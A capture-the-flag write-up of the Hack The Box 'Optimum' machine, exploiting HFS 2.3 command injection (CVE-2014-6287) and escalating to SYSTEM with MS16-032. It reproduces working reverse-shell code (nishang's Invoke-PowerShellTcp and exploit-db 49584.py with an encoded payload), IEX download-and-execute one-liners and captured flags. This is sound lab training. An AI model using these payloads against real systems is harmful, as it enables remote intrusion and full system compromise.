---
title: "HTB: Optimum [Easy]"
date: 2025-01-07 00:00 +0800
categories: [HTB]
tags: [HTB, Easy, Metasploit, Windows Server]
image: https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b
---

<img width="871" height="332" alt="image" src="https://github.com/user-attachments/assets/2211926e-985e-447e-a3c9-3ab451fcce0b" />

Exploited an outdated HTTP file server to gain initial access, then used a Windows kernel vulnerability to escalate privileges from standard user to SYSTEM. Multiple exploitation methods demonstrated including manual, automated scripts, and Metasploit framework.

## Recon
nmap scan result:
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ nmap -sCV -p- -T4 -vvv -oA nmap/ 10.10.10.8
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 15:19 +0800
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:19
Completed NSE at 15:19, 0.00s elapsed
Initiating Ping Scan at 15:19
Scanning 10.10.10.8 [4 ports]
Completed Ping Scan at 15:19, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:19
Completed Parallel DNS resolution of 1 host. at 15:19, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:19
Scanning 10.10.10.8 [65535 ports]
Discovered open port 80/tcp on 10.10.10.8
SYN Stealth Scan Timing: About 22.71% done; ETC: 15:21 (0:01:45 remaining)
SYN Stealth Scan Timing: About 58.56% done; ETC: 15:20 (0:00:43 remaining)
Completed SYN Stealth Scan at 15:20, 88.13s elapsed (65535 total ports)
Initiating Service scan at 15:20
Scanning 1 service on 10.10.10.8
Completed Service scan at 15:20, 6.24s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.8.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 5.05s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.48s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Nmap scan report for 10.10.10.8
Host is up, received echo-reply ttl 127 (0.015s latency).
Scanned at 2026-01-07 15:19:07 +08 for 100s
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
|_http-server-header: HFS 2.3
|_http-title: HFS /
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:20
Completed NSE at 15:20, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.67 seconds
           Raw packets sent: 131139 (5.770MB) | Rcvd: 74 (3.696KB)
```
From this scan result, we find an open `port 80` running `httpfileserver (HTP) 2.3` as the version.

## Initial Foothold

Initially, by visiting the website. We able to proved it. **[HTTP File Server (HFS)](https://rejetto.com/hfs/)** use to setup our machine as a webserver to transfer files without limit of size and speed. 

<img width="882" height="592" alt="image" src="https://github.com/user-attachments/assets/7c2239fa-d4b9-40a5-b885-07f79be5792c" />

Googled for **HFS 2.3** gave away that this version had **[CVE-2014-6287](https://www.exploit-db.com/exploits/49584)**. It is basically exploitable due to it internal scripting language that uses regex. By input `%00` initially inside search param, we would be able to escape and inject **HFS scripting** commands especially **[exec](https://rejetto.com/wiki/index.php%3Ftitle=HFS:_scripting_commands.html)**. Example: `{.exec|notepad.}`

### Manual Exploitation

We can try those with intercepting by using burpsuite. As i said, initially we need to have the `%00` null byte sequence followed by malicious code and this case we would want to ping `{.exec|ping 10.10.16.6.}`. Setup `tcpdump` inside our machine to make sure we can verify. As no direct output as response. Here's the command `sudo tcpdump -i tun0`

Used powershell reverse shell `Invoke-PowerShellTcp.ps1` from **[nishang](https://github.com/samratashok/nishang)**. Here's the content:
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ cat Invoke-PowerShellTcp.ps1
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )


    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.6 -Port 9876

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$
```
Setup a webserver and use `exac` to use powershell (make sure to use **64-bit** PowerShell) to download `Invoke-PowerShellTcp.ps1` from our machine.

> If you're in **64-bit** cmd.exe:
>
> %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe (launches 64-bit PowerShell)
> 
> %SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (launches 32-bit PowerShell)
>
> If you're in **32-bit** cmd.exe:
>
> %SystemRoot%\SysNative\WindowsPowerShell\v1.0\powershell.exe (launches 64-bit PowerShell)
> 
> %SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe (launches 32-bit PowerShell - gets redirected to SysWOW64)

```
%00{.exec|c:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8888/Invoke-PowerShellTcp.ps1').}
```
This PowerShell one-liner downloads and executes `Invoke-PowerShellTcp.ps1` directly in memory without saving it to disk.

<img width="1226" height="695" alt="image" src="https://github.com/user-attachments/assets/2b5b9b07-9525-47cf-8685-81541cc28323" />

Should be getting a shell

<img width="713" height="472" alt="image" src="https://github.com/user-attachments/assets/e8a6db7b-a11d-4f00-b6aa-96b6e99707fc" />

### Alternative Method 1: Python Script

There's 2 easier ways which by using script given from `searchsploit` and mirrored `49584.py`:
{% raw %}
```
┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ searchsploit hfs 2.3
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)                                                                                                  | windows/remote/49584.py
HFS Http File Server 2.3m Build 300 - Buffer Overflow (PoC)                                                                                                  | multiple/remote/48569.py
Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)                                                                                       | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload                                                                                               | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)                                                                                          | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)                                                                                          | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution                                                                                     | windows/webapps/34852.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results


┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ searchsploit -m  49584
  Exploit: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
      URL: https://www.exploit-db.com/exploits/49584
     Path: /usr/share/exploitdb/exploits/windows/remote/49584.py
    Codes: N/A
 Verified: False
File Type: ASCII text, with very long lines (546)
Copied to: /home/kryzi/Desktop/HTB/Optimum/49584.py

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ cat 49584.py
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.10.1"
lport = 1111
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')

┌──(kryzi㉿kryzi)-[~/Desktop/HTB/Optimum]
└─$ python3 49584.py 

Encoded the command in base64 format...

Encoded the payload and sent a HTTP GET request to the target...

Printing some information for debugging...
lhost:  10.10.16.6
lport:  9999
rhost:  10.10.10.8
rport:  80
payload:  exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANgAiACwAOQA5ADkAOQApADsAIAAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwAgAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAIAB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAMAAsACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAkAGkAKQA7ACAAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAIAAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAIAAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

Listening for connection...
listening on [any] 9999 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.8] 49288

PS C:\Users\kostas\Desktop> dir


    Directory: C:\Users\kostas\Desktop


Mode                LastWriteTime     Length Name                                                                      
----                -------------     ------ ----                                                                      
d----         13/1/2026   7:02 ??            %TEMP%                                                                    
-a---         18/3/2017   2:11 ??     760320 hfs.exe                                                                   
-ar--         13/1/2026   1:11 ??         34 user.txt                                                                  
-a---          7/1/2026   8:07 ??   10171904 win.exe                                                                   


PS C:\Users\kostas\Desktop> 
```

### Alternative Method 2: Metasploit

And also by using `msfconsole` as well which using `exploit/windows/http/rejetto_hfs_exec` module

We successfully able to get a shell as kostas
```
msf exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.6:6666 -> 10.10.10.8:49179 (10.10.10.8)

msf exploit(windows/http/rejetto_hfs_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 3056 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```
{% endraw %}

## Privilege Escalation

### Enumeration

We can find user flag from user **"kostas\Desktop"** directory:
```
C:\Users\kostas\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\kostas\Desktop

13/01/2026  04:37 ��    <DIR>          .
13/01/2026  04:37 ��    <DIR>          ..
13/01/2026  07:02 ��    <DIR>          %TEMP%
18/03/2017  02:11 ��           760.320 hfs.exe
13/01/2026  01:11 ��                34 user.txt
07/01/2026  08:07 ��        10.171.904 win.exe
               3 File(s)     10.932.258 bytes
               3 Dir(s)   5.675.802.624 bytes free

C:\Users\kostas\Desktop>type user.txt
type user.txt
dbf90e554885c75f0111d970f1a95d18
```
However, we required to escalate our privilege to system to access root flag.
```
C:\Users\kostas\Desktop>cd ../..
cd ../..

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users

18/03/2017  01:57 ��    <DIR>          .
18/03/2017  01:57 ��    <DIR>          ..
18/03/2017  01:52 ��    <DIR>          Administrator
18/03/2017  01:57 ��    <DIR>          kostas
22/08/2013  05:39 ��    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)   5.675.802.624 bytes free

C:\Users>cd Administrator
cd Administrator
Access is denied.

C:\Users>
```

### Local Exploit Suggester

Next step? If we are using metasploit framework. Of course, Local Suggester is the easier way:
```
C:\Users>^Z
Background channel 2? [y/N]  y
meterpreter >
Background session 1? [y/N]

msf exploit(windows/http/rejetto_hfs_exec) > search suggester                                                                                                                             
                                                                                                                                                                                               
Matching Modules                                                                                                                                                                               
================                                                                                                                                                                               
                                                                                                                                                                                               
   #  Name                                      Disclosure Date  Rank    Check  Description                                                                                                    
   -  ----                                      ---------------  ----    -----  -----------                                                                                                    
   0  post/multi/recon/local_exploit_suggester  .                normal  No     Multi Recon Local Exploit Suggester                                                                            
   1  post/multi/recon/persistence_suggester    .                normal  No     Persistence Exploit Suggester                                                                                  


Interact with a module by name or index. For example info 1, use 1 or use post/multi/recon/persistence_suggester

msf exploit(windows/http/rejetto_hfs_exec) > use 0
msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > exploit -j
[*] Post module running as background job 5.
msf post(multi/recon/local_exploit_suggester) >
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] Collecting exploit 2584 / 2584
[*] 10.10.10.8 - 229 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 43 / 43
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 8   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 9   exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 10  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 11  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 12  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 13  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 14  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 15  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 16  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 17  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 18  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 19  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 20  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 21  exploit/windows/local/lexmark_driver_privesc                   No                       The check raised an exception.
 22  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 23  exploit/windows/local/ms10_015_kitrap0d                        No                       The target is not exploitable.
 24  exploit/windows/local/ms10_092_schelevator                     No                       The target is not exploitable. Windows Server 2012 R2 (6.3 Build 9600). is not vulnerable
 25  exploit/windows/local/ms13_053_schlamperei                     No                       The target is not exploitable.
 26  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 27  exploit/windows/local/ms14_058_track_popup_menu                No                       The target is not exploitable.
 28  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 29  exploit/windows/local/ms15_004_tswbproxy                       No                       The target is not exploitable.
 30  exploit/windows/local/ms15_051_client_copy_image               No                       The target is not exploitable.
 31  exploit/windows/local/ms16_016_webdav                          No                       The target is not exploitable.
 32  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 33  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/ntusermndragover                         No                       The target is not exploitable.
 38  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 39  exploit/windows/local/ppr_flatten_rec                          No                       The target is not exploitable.
 40  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 41  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 42  exploit/windows/local/webexec                                  No                       The check raised an exception.
 43  exploit/windows/persistence/notepadpp_plugin_persistence       No                       The target is not exploitable. Notepad++ is probably not present


msf post(multi/recon/local_exploit_suggester) > 
```
### MS16-032 via Metasploit

Ive tried multiple but one of it that work for me is `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`:

Here's the explaination from my Claude:
> Most exploits failed because they were UAC bypasses (need admin group) or had validation issues. MS16-032 worked because it's a true privilege escalation from low-priv user → SYSTEM, which is exactly what you needed. It's one of the most reliable Windows local privesc exploits for Server 2012 R2!

```
msf post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 1234
lport => 1234
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
[*] Started reverse TCP handler on 10.10.16.6:1234
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\YplsUwkW.ps1...
[*] Compressing script contents...
[+] Compressed size: 3753
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2000

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[ref] cannot be applied to a variable that does not exist.
At line:200 char:3
+         $eCwJF = [Ntdll]::NtImpersonateThread($jX, $jX, [ref]$myjhj)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (myjhj:VariablePath) [], Runti
   meException
    + FullyQualifiedErrorId : NonExistingVariableReference

[!] NtImpersonateThread failed, exiting..
[+] Thread resumed!

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
At line:259 char:2
+     $eCwJF = [Advapi32]::DuplicateToken($sy2nh, 2, [ref]$tXK)
+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodException
    + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument

[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

Qi1IepeC52GvYvbJ6U57a7mrBibQt8s2
[+] Executed on target machine.
[*] Sending stage (188998 bytes) to 10.10.10.8
[*] Meterpreter session 2 opened (10.10.16.6:1234 -> 10.10.10.8:49183) at 2026-01-07 17:06:25 +0800
[+] Deleted C:\Users\kostas\AppData\Local\Temp\YplsUwkW.ps1

meterpreter >

```
### Shell as system

```
meterpreter > shell
Process 1980 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system

C:\Users\kostas\Desktop>cd ../../Administrator/Desktop/
cd ../../Administrator/Desktop/

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EE82-226D

 Directory of C:\Users\Administrator\Desktop

18/03/2017  02:14 ��    <DIR>          .
18/03/2017  02:14 ��    <DIR>          ..
13/01/2026  01:11 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5.675.790.336 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
a66613d0cc1c353b8574adc17fc0800e

C:\Users\Administrator\Desktop
```

## Beyond root

There's another ways that i learned recently which uses sherlock and empire. (Learned from IppSec video walkthrough)

> **[Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)** is a PowerShell script used in penetration testing and ethical hacking to quickly find missing software patches and vulnerabilities on a Windows system that could allow for local privilege escalation
> 
> **[Empire](https://github.com/BC-SECURITY/Empire)** is a post-exploitation framework used in penetration testing to maintain control and perform actions on compromised Windows/Linux systems after initial access is gained.

```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8888/Sherlock.ps1')


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
